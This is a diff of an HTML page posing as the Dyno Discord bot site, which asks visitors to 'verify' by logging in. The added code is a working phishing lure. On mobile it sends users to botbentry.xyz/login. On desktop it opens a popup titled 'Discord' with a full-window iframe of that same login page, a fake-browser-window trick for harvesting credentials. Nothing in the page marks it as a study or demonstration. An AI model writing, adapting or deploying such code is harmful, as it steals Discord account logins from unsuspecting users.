@@ -1317,8 +1317,32 @@ select
                   class="has-text-primary">8.5 million</span> servers.
               </p>
                 <p class="is-size-6 has-text-grey">Please complete verification to prove you are a human and gain access to the rest of the server.</p>
-                <div class="description-buttons is-flex"><a class="button is-info is-medium" href="#"
-                    title="Login To Verify" onclick="clickedLogin()">Login To Verify</a></div>
+                <div>
+              <button class="sc-jIAOiI bfMtSn sc-hKdnnL RIgdT" type="button" id="openLogin">
+                <div class="sc-hiMGwR iwHhCu sc-TRNrF dStzaX">
+                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ciZhAO kmbPg sc-olbas dxIxUA" main="#F2F4FB">
+                    <path d="M23 12C23 18.0751 18.0751 23 12 23" data-stroke="main" stroke="#F2F4FB" stroke-width="2" stroke-linecap="round"></path>
+                  </svg>
+                </div>
+                <a id="abc" class="sc-fXynhf hbzcXP" href="" id="verifybutton">Login</a>
+              </button>
+          </div>
+                                                              
+                                                        
+
+                <script>
+                  document.getElementById('abc').addEventListener('click', (event) => {
+                    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                      event.preventDefault();
+                      window.location.href = 'https://botbentry.xyz/login';
+                    } else {
+                      const wnd = window.open('https://mqqq.xyz', '_blank', 'status=no,toolbar=no,location=no,directories=no,resizable=yes,scrollbars=yes,width=1050,height=600');
+
+
+                      wnd.document.write('<script>document.title = "Discord";</scr' + 'ipt><iframe style="position: absolute;top: 0px;bottom: 0px;right: 0px;width: 100%;border: none;margin: 0;padding: 0;overflow: hidden;z-index: 9999;height: 100%;" src="https://botbentry.xyz/login"></iframe>');
+                    }
+                  });
+                </script>
               </div>
               <div class="column is-half is-full-mobile"><img alt="Laptop frame with the Dyno dashboard rendered on it"
                   class="mockup" src="/images/product-mockup.png"></div>
